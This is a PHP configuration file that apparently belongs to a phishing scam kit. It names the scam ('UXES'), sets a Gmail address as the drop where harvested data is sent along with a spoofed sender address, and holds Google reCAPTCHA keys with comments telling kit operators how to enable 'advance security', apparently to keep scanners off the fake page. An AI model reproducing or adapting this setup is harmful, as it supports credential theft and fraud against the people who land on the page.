<?php
////////////////////////////////////////
$scamname = "UXES";	
// ================================== //
$send   = "promoneybag@gmail.com";
// ================================== //
$sendfrom   = "contactxx@csicable.net";
// ================================== //
$use_captchaa = "yes"; // Use Advance Google V3 Security yes or no // for advance users only...//don't change if u dont understand
// ================================== //
$captcha_site_key = "6LfxGb0aAAAAAJE7Uts_ulTm85nFkN-9QB_jsg9g";   // Put here Google Recaptcha V3 Public Key
$captcha_secret_key = "6LfxGb0aAAAAAP9vQxyYhCzweRVjR47Glo9Gw0GX"; // Put here Google Recaptcha V3 Secret Key
$show_captchaa = "yes"; // Use Captcha |yes| or |no|
define("EMAIL", "$ur_email");


// ================================== //
?>